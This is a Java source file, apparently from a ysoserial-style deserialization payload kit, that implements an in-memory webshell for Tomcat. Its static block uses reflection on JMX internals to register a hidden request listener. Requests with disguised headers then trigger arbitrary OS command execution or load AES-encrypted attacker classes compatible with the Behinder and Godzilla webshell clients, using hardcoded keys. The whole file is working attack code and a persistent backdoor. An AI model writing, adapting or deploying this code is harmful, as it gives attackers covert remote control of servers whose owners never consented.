package ysoserial.payloads.templates;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpSession;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.Scanner;
import java.util.Set;

public class TomcatListenerMemShellFromJMX extends AbstractTranslet implements ServletRequestListener {
    static {
        try {
            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository = (Repository) field.get(obj);

            Set<NamedObject> objectSet = repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            if (objectSet.size() == 0) {
                // springboot的jmx中为Tomcat而非Catalina
                objectSet = repository.query(new ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            }

            for (NamedObject namedObject : objectSet) {
                DynamicMBean dynamicMBean = namedObject.getObject();
                field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                field.setAccessible(true);
                obj = field.get(dynamicMBean);

                field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                field.setAccessible(true);
                StandardContext standardContext = (StandardContext) field.get(obj);

                TomcatListenerMemShellFromJMX listener = new TomcatListenerMemShellFromJMX();
                standardContext.addApplicationEventListener(listener);
            }
        } catch (Exception e) {
//            e.printStackTrace();
        }
    }

    String xc = "f55e27746884a4bd";// ck4Gr4Qi
    String pass = "pass";
    String md5 = md5(pass + xc);
    Class payload;

    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
// Listener马没有包装类问题
        try {
            RequestFacade requestFacade = (RequestFacade) servletRequestEvent.getServletRequest();
            Field field = requestFacade.getClass().getDeclaredField("request");
            field.setAccessible(true);
            Request request = (Request) field.get(requestFacade);
            Response response = request.getResponse();
            // 入口
            if (request.getHeader("Referer").equalsIgnoreCase("https://www.google.com/")) {
                // cmdshell
                if (request.getHeader("x-client-data").equalsIgnoreCase("cmd")) {
                    String cmd = request.getHeader("cmd");
                    if (cmd != null && !cmd.isEmpty()) {
                        String[] cmds = null;
                        if (System.getProperty("os.name").toLowerCase().contains("win")) {
                            cmds = new String[]{"cmd", "/c", cmd};
                        } else {
                            cmds = new String[]{"/bin/bash", "-c", cmd};
                        }
                        String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                        response.resetBuffer();
                        response.getWriter().println(result);
                        response.flushBuffer();
                        response.finishResponse();
                    }
                } else if (request.getHeader("x-client-data").equalsIgnoreCase("rebeyond")) {
                    if (request.getMethod().equals("POST")) {
                        // 创建pageContext
                        HashMap pageContext = new HashMap();

                        // lastRequest的session是没有被包装的session!!
                        HttpSession session = request.getSession();
                        pageContext.put("request", request);
                        pageContext.put("response", response);
                        pageContext.put("session", session);
                        // 这里判断payload是否为空 因为在springboot2.6.3测试时request.getReader().readLine()可以获取到而采取拼接的话为空字符串
                        String payload = request.getReader().readLine();

//                        System.out.println(payload);
                        // 冰蝎逻辑
                        String k = "f55e27746884a4bd"; // ck4Gr4Qi
                        session.putValue("u", k);
                        Cipher c = Cipher.getInstance("AES");
                        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                        Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                        method.setAccessible(true);
                        byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(payload));
                        Class evilclass = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                        evilclass.newInstance().equals(pageContext);
                    }
                } else if (request.getHeader("x-client-data").equalsIgnoreCase("godzilla")) {
                    // 哥斯拉是通过 localhost/?pass=payload 传参 不存在包装类问题
                    byte[] data = base64Decode(request.getParameter(pass));
                    data = x(data, false);
                    if (payload == null) {
                        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
                        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                        defMethod.setAccessible(true);
                        payload = (Class) defMethod.invoke(urlClassLoader, data, 0, data.length);
                    } else {
                        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                        Object f = payload.newInstance();
                        f.equals(arrOut);
                        f.equals(data);
                        f.equals(request);
                        response.resetBuffer();
                        response.getWriter().write(md5.substring(0, 16));
                        f.toString();
                        response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
                        response.getWriter().write(md5.substring(16));
                        response.flushBuffer();
                        response.finishResponse();
                    }
                } else {
                    response.resetBuffer();
                    response.getWriter().println("error");
                    response.flushBuffer();
                    response.finishResponse();
                }
            }
        } catch (Exception e) {
//            e.printStackTrace();
        }
    }
}
